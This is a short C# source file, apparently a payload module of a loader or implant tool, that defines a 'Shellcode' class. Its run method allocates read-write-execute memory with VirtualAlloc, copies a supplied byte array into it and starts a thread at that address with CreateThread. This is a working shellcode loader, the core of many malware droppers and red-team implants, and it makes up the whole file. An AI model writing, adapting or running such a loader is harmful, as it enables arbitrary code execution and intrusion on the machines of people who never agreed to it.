using System;
using System.Threading;
using System.Runtime.InteropServices;

namespace Reader.Payloads
{
    class Shellcode : IPayload
    {
        void IPayload.run(byte[] payload_data)
        {
            IntPtr ptr = VirtualAlloc((IntPtr)0, payload_data.Length, 0x3000, 0x40);
            Marshal.Copy(payload_data, 0, (IntPtr)ptr, payload_data.Length);

            CreateThread(0, 0, ptr, (IntPtr)0, 0, 0);
            Thread.Sleep(3000);
        }

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            Int32 dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          UInt32 lpThreadId
          );
    }
}
